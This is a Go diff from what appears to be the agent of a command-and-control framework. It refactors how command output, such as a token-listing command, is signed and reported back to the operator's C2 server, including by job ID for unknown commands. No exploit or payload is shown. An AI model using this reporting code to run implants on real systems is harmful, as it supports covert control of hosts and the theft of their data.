@@ -46,6 +46,21 @@ func send2CC(data *def.MsgTunData) error {
 
 // NotifyC2 send response to a cobra command to CC, like fmt.Printf
 func NotifyC2(cmd *cobra.Command, format string, args ...any) {
+	job_id, _ := cmd.Flags().GetString("job_id")
+	quiet, _ := cmd.Flags().GetBool("quiet")
+	notifyC2Core(cmd.Name(), job_id, quiet, format, args...)
+}
+
+// NotifyC2JobID sends a response with an explicit JobID and no command
+// context. Use this when cobra never reached flag parsing (unknown command:
+// Find() fails first), where NotifyC2 would read an unset --job_id and the CC
+// would drop the response — the operator panel would show nothing for a
+// typo'd command. CmdSlice is left empty; the CC routes these by JobID.
+func NotifyC2JobID(jobID, format string, args ...any) {
+	notifyC2Core("", jobID, false, format, args...)
+}
+
+func notifyC2Core(cmdName, jobID string, quiet bool, format string, args ...any) {
 	msg := def.MsgTunData{
 		Tag:       common.RuntimeConfig.AgentTag,
 		AgentUUID: common.RuntimeConfig.AgentUUID,
@@ -53,21 +68,21 @@ func NotifyC2(cmd *cobra.Command, format string, args ...any) {
 	// Sign UUID with Agent Key for session auth
 	sig, err := agentutils.SignWithAgentKey([]byte(msg.AgentUUID))
 	if err != nil {
-		logging.Errorf("NotifyC2 SignWithAgentKey: %v", err)
+		logging.Errorf("notifyC2Core SignWithAgentKey: %v", err)
 		return
 	}
 	msg.AgentUUIDSig = base64.URLEncoding.EncodeToString(sig)
-	job_id, _ := cmd.Flags().GetString("job_id")
-	cmdSlice := []string{cmd.Name()}
-	// A --quiet invocation (e.g. `!list_tokens --quiet` issued by the CC
-	// completion machinery) still ships its data back to the CC, but the CC
-	// uses the marker to skip rendering it in the operator console.
-	// Commands without a --quiet flag simply never match (GetBool error ignored).
-	if quiet, _ := cmd.Flags().GetBool("quiet"); quiet {
-		cmdSlice = append(cmdSlice, "--quiet")
+	if cmdName != "" {
+		cmdSlice := []string{cmdName}
+		// A --quiet invocation (e.g. `!list_tokens --quiet` issued by the CC
+		// completion machinery) still ships its data back to the CC, but the CC
+		// uses the marker to skip rendering it in the operator console.
+		if quiet {
+			cmdSlice = append(cmdSlice, "--quiet")
+		}
+		msg.CmdSlice = cmdSlice
 	}
-	msg.JobID = job_id
-	msg.CmdSlice = cmdSlice
+	msg.JobID = jobID
 	msg.Response = []byte(fmt.Sprintf(format, args...))
 	if err := send2CC(&msg); err != nil {
 		logging.Errorf("%v", err)
